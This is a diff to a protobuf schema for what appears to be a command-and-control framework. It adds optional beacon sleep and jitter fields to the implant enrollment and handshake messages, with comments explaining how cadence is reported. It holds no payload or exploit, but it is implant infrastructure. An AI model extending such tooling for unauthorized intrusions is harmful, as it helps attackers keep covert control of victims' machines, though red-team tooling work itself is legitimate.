@@ -207,6 +207,13 @@ enum EnrollStatus {
 // machine it runs on; kill_date is the artifact's baked time fuse as the
 // implant reported it, RFC 3339. Strings left empty mean "not supplied",
 // the same nullability the JSON body's omitted keys carry.
+//
+// sleep_seconds and jitter_seconds are the baked contact cadence the implant
+// runs (architecture.md Sec 7): the base interval between contacts and the
+// jitter half-width applied around it. Optional presence: an implant that
+// does not report them enrolls exactly as it always did, and the fleet shows
+// no cadence for it. The live cadence re-advertises at every handshake, so a
+// beacon.sleep retune lands on the record at the next contact.
 message EnrollRequest {
   string stager_token_secret = 1;
   string class = 2;
@@ -217,6 +224,8 @@ message EnrollRequest {
   string arch = 7;
   string username = 8;
   string kill_date = 9;
+  optional double sleep_seconds = 10;
+  optional double jitter_seconds = 11;
 }
 
 // The enrollment response. On OK, carries the newly issued
@@ -279,6 +288,16 @@ message HandshakeRequest {
   // replay_nonces, a handshake that stops advertising must drop the arm, or
   // the server would requeue dispatches an unupgraded implant already ran.
   optional bool task_acks = 5;
+  // The implant's current contact cadence (architecture.md Sec 7): the base
+  // sleep and the jitter half-width, in seconds, as the implant runs them
+  // right now -- mutable at run time through beacon.sleep, so this is the
+  // fresh advertisement, not the baked one (enrollment carries that). Absent
+  // on a handshake from an implant that does not report cadence, and the
+  // record keeps whatever it last held. The envelope poll cycle and every
+  // stream connect open with a handshake, so one advertisement rides each
+  // contact without a frame of its own.
+  optional double sleep_seconds = 6;
+  optional double jitter_seconds = 7;
 }
 
 // Outcome of the handshake. OK means presence is recorded and the stream is
